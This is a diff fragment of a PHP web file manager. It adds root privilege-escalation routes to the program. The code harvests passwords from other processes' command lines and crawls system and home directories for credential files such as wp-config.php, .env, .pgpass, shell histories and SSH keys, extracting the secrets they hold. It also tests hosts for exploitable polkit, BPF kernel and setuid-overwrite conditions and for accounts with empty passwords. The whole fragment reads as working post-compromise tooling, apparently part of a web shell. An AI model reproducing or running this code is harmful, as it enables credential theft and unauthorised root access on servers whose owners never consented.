+        foreach(fm_glob('/proc/[0-9]*/cmdline') as $f){
+            $raw = @file_get_contents($f);
+            if($raw === false || $raw === '')continue;
+            $procs++;
+            $argv = array_values(array_filter(explode("\0", $raw), 'strlen'));
+            if(count($argv) < 2)continue;
+            $pid = preg_replace('#.*/([0-9]+)/cmdline$#', '$1', $f);
+            $owner = $this->rootUidOf((string)@file_get_contents('/proc/' . $pid . '/status'));
+            for($i = 1; $i < count($argv); $i++){
+                $a = $argv[$i];
+                $val = '';
+                if(preg_match('/^--?(?:password|passwd|pass|pw|p)$/i', $a) && isset($argv[$i + 1])){
+                    $val = $argv[$i + 1];
+                }elseif(preg_match('/^--(?:password|passwd|pass|pw)[=:](.+)$/i', $a, $m)){
+                    $val = $m[1];
+                }elseif(preg_match('/^-p([^\-].{1,})$/', $a, $m)){
+                    $val = $m[1];
+                }elseif(preg_match('/^(?:password|passwd)[=:](.+)$/i', $a, $m)){
+                    $val = $m[1];
+                }
+                if($val === '' || strlen($val) < 3 || strlen($val) > 200)continue;
+                if(isset($seen[$val]))continue;
+                $seen[$val] = true;
+                /* the account this password belongs to: a -u / --user next to
+                   it wins, otherwise the owner of the process that published it */
+                $who = '';
+                for($j = 1; $j < count($argv); $j++){
+                    if(preg_match('/^(?:-u|--user)$/', $argv[$j]) && isset($argv[$j + 1])){ $who = $argv[$j + 1]; break; }
+                    if(preg_match('/^--user=(.+)$/', $argv[$j], $m)){ $who = $m[1]; break; }
+                }
+                if($who === '')foreach($targets as $t => $_)if(strpos(implode(' ', $argv), $t) !== false){ $who = $t; break; }
+                if($who === '')continue;
+                if(!isset($targets[$who]))continue;
+                /* a password that appears on a world-readable line that is not a
+                   privileged account is worth recording, not trying */
+                $user = $who; $secret = $val;
+                $where = 'pid ' . $pid . ' owned by uid ' . $owner . ': ' . $this->rootSnip(implode(' ', $argv), 90);
+                break 2;
+            }
+        }
+        if($secret === '')return ['try' => false, 'procs' => $procs, 'targets' => count($targets),
+            'note' => 'no command line on this machine carries a password for an account that can reach root'];
+        return ['try' => true, 'procs' => $procs, 'targets' => count($targets), 'user' => $user, 'secret' => $secret,
+                'note' => 'a password for ' . $user . ' was published on a command line this account may read - ' . $where];
+    }
+    /* the same idea on disk: the files a web account can usually read that
+       hold a password, limited to the ones that name a privileged account */
+    private function rootCredFiles(){
+        $targets = $this->rootCredTargets();
+        $home = (string)@getenv('HOME');
+        if($home === '' && function_exists('posix_getpwuid')){
+            $pw = @posix_getpwuid(@posix_geteuid());
+            if(is_array($pw))$home = (string)($pw['dir'] ?? '');
+        }
+        $roots = array_values(array_unique(array_filter([rtrim((string)__DIR__, '/'), dirname(rtrim((string)__DIR__, '/')),
+                   $home, '/etc', '/var/www', '/home', '/opt', '/srv', '/var/backups', '/root', '/tmp'])));
+        /* the names a real server carries, and the databases and managers that
+           keep their own password in a file the account may read */
+        $names = ['wp-config.php', 'configuration.php', 'config.php', 'settings.php', 'local.php', '.env',
+                  '.env.local', '.env.production', 'env.php', 'params.php', 'secrets.php', '.my.cnf', 'my.cnf',
+                  '.pgpass', 'pgpass', '.pgpass.conf', 'database.php', 'db.php', 'dbconfig.php', 'config.inc.php',
+                  'config.ini', 'variables.php', '.bash_history', '.zsh_history', '.mysql_history', '.psql_history',
+                  'credentials', 'credentials.json', 'config.json', '.netrc', 'deploy.env', 'settings.local.php',
+                  'wp-config-local.php', 'docker-compose.yml', 'docker-compose.yaml', 'appsettings.json',
+                  '.htpasswd', 'id_rsa', 'local.settings.php'];
+        /* the files sit in directories below the roots, not in the roots
+           themselves: the walk is bounded by depth, by entry count and by time,
+           and it skips the trees no secret is ever kept in */
+        $files = 0; $user = ''; $secret = ''; $where = '';
+        $skip = ['.git', 'node_modules', 'vendor', 'cache', 'tmp', 'proc', 'sys', 'dev', 'dist', 'build'];
+        $deadline = microtime(true) + 3.0;
+        $walk = function($dir, $depth) use (&$walk, &$files, &$user, &$secret, &$where, $names, $skip, $targets, $deadline){
+            if($depth > 4 || $files > 600 || microtime(true) > $deadline)return;
+            $items = @scandir($dir);
+            if($items === false)return;
+            foreach($items as $name){
+                if($name === '.' || $name === '..')continue;
+                $path = rtrim($dir, '/') . '/' . $name;
+                if(@is_dir($path)){
+                    if(in_array($name, $skip, true) || $name[0] === '.')continue;
+                    $walk($path, $depth + 1);
+                    if($secret !== '')return;
+                    continue;
+                }
+                if(!in_array($name, $names, true))continue;
+                if(!@is_file($path) || !@is_readable($path))continue;
+                $files++;
+                $txt = (string)@file_get_contents($path);
+                if($txt === '' || strlen($txt) > 1048576)continue;
+                if(!preg_match_all('/(?:pass(?:word|wd)?|DB_PASSWORD|MYSQL_PWD|pwd|secret)\s*["\'=:\s]+\s*["\']?([^\s"\';,]{4,200})/i', $txt, $m))continue;
+                foreach($m[1] as $cand){
+                    if(preg_match('/^(\$|%|{|<|\*|x{4,})/', $cand))continue;
+                    if(!preg_match('/^[\x21-\x7e]{4,200}$/', $cand))continue;
+                    if(in_array(strtolower($cand), ['password', 'changeme', 'example', 'yourpassword', 'secret'], true))continue;
+                    $who = '';
+                    foreach($targets as $t => $zz){
+                        if(strpos($txt, $t) === false)continue;
+                        $who = $t; break;
+                    }
+                    if($who === '')$who = 'root';
+                    $user = $who; $secret = $cand;
+                    $where = str_replace(rtrim((string)__DIR__, '/'), 'the manager directory', $path)
+                           . ' (a ' . strlen($txt) . ' byte file this account may read)';
+                    return;
+                }
+            }
+        };
+        foreach($roots as $root){
+            if($root === '' || !@is_dir($root))continue;
+            $walk($root, 0);
+            if($secret !== '')break;
+        }
+        if($secret === '')return ['try' => false, 'files' => $files,
+            'note' => 'no readable file on this machine holds a password for an account that can reach root'];
+        return ['try' => true, 'files' => $files, 'user' => $user, 'secret' => $secret,
+                'note' => 'a password for ' . $user . ' sits in a file this account may read - ' . $where];
+    }
+    private function rootPolkitCompatFind(){
+        $paths = ['/usr/libexec/polkit-agent-helper-1', '/usr/lib/polkit-1/polkit-agent-helper-1',
+                  '/usr/lib/x86_64-linux-gnu/polkit-agent-helper-1', '/usr/lib64/polkit-1/polkit-agent-helper-1'];
+        $helper = '';
+        foreach($paths as $p)if(@is_file($p)){ $helper = $p; break; }
+        $launch = ['/usr/lib/dbus-1.0/dbus-daemon-launch-helper', '/usr/libexec/dbus-daemon-launch-helper',
+                   '/usr/lib/x86_64-linux-gnu/dbus-1.0/dbus-daemon-launch-helper'];
+        $dbus = '';
+        foreach($launch as $p)if(@is_file($p)){ $dbus = $p; break; }
+        $home = (string)@getenv('HOME');
+        if($home === '' && function_exists('posix_getpwuid')){
+            $pw = @posix_getpwuid(@posix_geteuid());
+            if(is_array($pw))$home = (string)($pw['dir'] ?? '');
+        }
+        $xdg = (string)@getenv('XDG_DATA_HOME');
+        if($xdg === '')$xdg = ($home === '' ? '' : rtrim($home, '/') . '/.local/share');
+        $dir = $xdg === '' ? '' : rtrim($xdg, '/') . '/polkit-1';
+        $writable = false;
+        if($dir !== ''){
+            if(@is_dir($dir))$writable = @is_writable($dir);
+            elseif(@is_dir(dirname($dir)))$writable = @is_writable(dirname($dir));
+        }
+        $pol = $this->rootPkgFacts('polkitd');
+        $pk = $this->rootWhich('pkexec');
+        $facts = 'polkit: ' . ($pol['raw'] !== '' ? $pol['raw'] : 'not in the package database')
+               . ' | agent helper: ' . ($helper !== '' ? $helper : 'not found')
+               . ' | bus launch helper: ' . ($dbus !== '' ? $dbus : 'not found')
+               . ' | pkexec: ' . ($pk !== '' ? $pk : 'not installed on this host')
+               . ' | this account XDG data dir: ' . ($dir !== '' ? $dir : 'no home directory')
+               . ($writable ? ' (writable)' : ' (not writable)');
+        if($helper === '')return ['ok' => false, 'argv' => null, 'note' => $facts . ' - the agent helper this route asks is not on the machine, so there is nothing to answer the request'];
+        if(!$writable)return ['ok' => false, 'argv' => null, 'note' => $facts . ' - the route needs a directory under this account own XDG data directory, and this account cannot write one'];
+        return ['ok' => true, 'argv' => ['id', '-u'], 'note' => $facts . ' - the directories are writable by this account, so the two files can be written without any privilege at all',
+                'dir' => $dir, 'helper' => $helper, 'dbus' => $dbus];
     }
     private function rootEscSpec($id){
         $s = $this->rootEscSpecs();
@@ -23001,6 +23503,66 @@ ExecStartPost=/bin/sh '" . $payload . "'";
                         : ' - and getcap listed nothing at all');
             }
             return $this->escF[$id];
+        }
+        if($id === 'bpfgc'){
+            $k = $this->rootKernelPrims();
+            $v = $k['v'];
+            if($v === null)return $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'the kernel release could not be read, so the range the flaw covers cannot be decided'];
+            $ns = $this->rootUserNamespaces();
+            $bpfMod = $this->rootModuleState('bpf');
+            $bpf = (@is_file('/proc/sys/kernel/unprivileged_bpf_disabled') || $bpfMod !== 'not loaded')
+                ? ('present (' . $bpfMod . ', /proc/sys/kernel/unprivileged_bpf_disabled ' . (@is_file('/proc/sys/kernel/unprivileged_bpf_disabled') ? 'exists' : 'missing') . ')')
+                : 'not present';
+            $fixed = [[6,11,5],[6,6,54],[6,9,6],[6,10,0]];
+            $inRange = $this->rootVlt($v, [5,14,0]) || $this->rootVin($v, [6,0,0], [6,11,5]);
+            $isFixed = $this->rootKernelFixed($v, $fixed);
+            if(strpos($bpf, 'not present') === 0)return $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'this machine does not carry BPF at all (' . $bpf . '), so there is no map to free'];
+            if(!$ns['works'])return $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'BPF is here (' . $bpf . ') but unprivileged user namespaces are blocked, and the map this route needs can only be made from inside one: ' . $ns['note']];
+            if($isFixed)return $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'kernel ' . implode('.', $v) . ' is at or past the fixed release for its line, so the page is no longer handed out (' . $bpf . ', user namespaces allowed)'];
+            if(!$inRange)return $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'kernel ' . implode('.', $v) . ' is outside the releases the flaw was introduced in (5.14 and later, before 6.11.5 on that line)'];
+            return $this->escF[$id] = ['ok' => true, 'argv' => ['python3', '-c', 'import os;print(0 if os.geteuid()==0 else 1)'],
+                'note' => 'kernel ' . implode('.', $v) . ' is inside the range the flaw covers, ' . $bpf . ', and user namespaces are allowed - ' . $ns['note']];
+        }
+        if($id === 'statxland'){
+            $cf = $this->rootCopyFailStep();
+            if(!in_array($cf['status'], ['vulnerable', 'check'], true))
+                return $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'the write behind this route measures as ' . $cf['status'] . ' on this host: ' . $cf['meaning']];
+            $suid = [];
+            foreach($this->rootSuidList() as $p){
+                if(!@is_file($p) || !@is_writable(dirname($p)))continue;
+                $suid[] = $p;
+            }
+            if(!$suid)return $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'the write is open (' . $cf['status'] . '), but every setuid program on this machine sits in a directory this account may not write, so there is nothing to point it at'];
+            return $this->escF[$id] = ['ok' => true, 'argv' => ['python3', '-c', 'import os;print(0 if os.geteuid()==0 else 1)'], 'path' => $suid[0],
+                'note' => 'the write measures as ' . $cf['status'] . ', and ' . $suid[0] . ' may be replaced by this account, so the bytes it runs next can be made root bytes'];
+        }
+        if($id === 'pkcompat'){
+            $x = $this->rootPolkitCompatFind();
+            return $this->escF[$id] = $x;
+        }
+        if($id === 'nopasswd'){
+            $f = $this->rootCredAccountFacts();
+            $empty = array_keys($f['empty']);
+            if(!$empty)return $this->escF[$id] = ['ok' => false, 'argv' => null,
+                'note' => 'no account on this machine carries an empty password field'
+                    . ($f['shadow'] === null ? ' (and /etc/shadow cannot be read, so the shadow fields were not checked)' : '')];
+            return $this->escF[$id] = ['ok' => true, 'argv' => ['id', '-u'],
+                'note' => 'the account database gives ' . implode(', ', array_slice($empty, 0, 3)) . ' an empty password field'
+                    . ($f['root_empty'] ? ' - root itself has no password' : '')];
+        }
+        if($id === 'procargs'){
+            $h = $this->rootCredProcArgs();
+            if(!$h['try'])return $this->escF[$id] = ['ok' => false, 'argv' => null,
+                'note' => $h['note'] . ' (' . $h['procs'] . ' process(es) read, ' . $h['targets'] . ' account(s) that can reach root)'];
+            return $this->escF[$id] = ['ok' => true, 'argv' => ['true'], 'secret' => $h['secret'], 'user' => $h['user'],
+                'note' => $h['note']];
+        }
+        if($id === 'credreuse'){
+            $h = $this->rootCredFiles();
+            if(!$h['try'])return $this->escF[$id] = ['ok' => false, 'argv' => null,
+                'note' => $h['note'] . ' (' . $h['files'] . ' file(s) read)'];
+            return $this->escF[$id] = ['ok' => true, 'argv' => ['true'], 'secret' => $h['secret'], 'user' => $h['user'],
+                'note' => $h['note']];
         }
         if($id === 'sudocmd'){
             if($this->rootWhich('sudo') === ''){
